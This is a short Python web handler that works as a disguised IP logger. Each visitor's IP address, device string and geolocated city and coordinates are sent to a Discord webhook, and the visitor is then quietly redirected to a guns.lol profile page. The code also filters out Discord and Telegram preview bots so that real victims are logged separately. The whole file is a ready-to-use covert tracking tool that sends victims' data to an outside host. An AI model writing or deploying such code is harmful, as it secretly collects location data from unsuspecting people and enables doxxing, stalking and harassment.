from http.server import BaseHTTPRequestHandler
import requests
import json

# Replace with your actual Discord Webhook URL
WEBHOOK_URL = "YOUR_ACTUAL_WEBHOOK_URL_HERE"
REDIRECT_URL = "https://guns.lol/sleezyyyyyy"

class handler(BaseHTTPRequestHandler):
    def do_GET(self):
        ua = self.headers.get('User-Agent', 'Unknown')
        # Get the IP simply and reliably
        ip = self.headers.get('x-forwarded-for', self.client_address[0]).split(',')[0]
        
        is_bot = any(bot in ua for bot in ["Discordbot", "TelegramBot"])
        
        # Try to get extra info, but don't let it break the script
        city = "Unknown"
        coords = "Unknown"
        try:
            geo = requests.get(f"http://ip-api.com/json/{ip}", timeout=3).json()
            if geo.get('status') == 'success':
                city = f"{geo.get('city')}, {geo.get('country')}"
                coords = f"{geo.get('lat')}, {geo.get('lon')}"
        except:
            pass

        # Build the message
        title = "📤 Link Sent" if is_bot else "🎯 New Visitor Logged!"
        color = 3447003 if is_bot else 16711680

        payload = {
            "embeds": [{
                "title": title,
                "color": color,
                "description": f"**IP Address:** `{ip}`\n**Location:** {city}\n**Coordinates:** {coords}",
                "fields": [
                    {"name": "📱 Device", "value": f"```{ua[:150]}```"}
                ],
                "footer": {"text": "Guns.lol Redirect"}
            }]
        }

        # Send the ping
        try:
            requests.post(WEBHOOK_URL, json=payload, timeout=5)
        except:
            print("Failed to send to Discord")

        # Always redirect
        self.send_response(302)
        self.send_header('Location', REDIRECT_URL)
        self.end_headers()
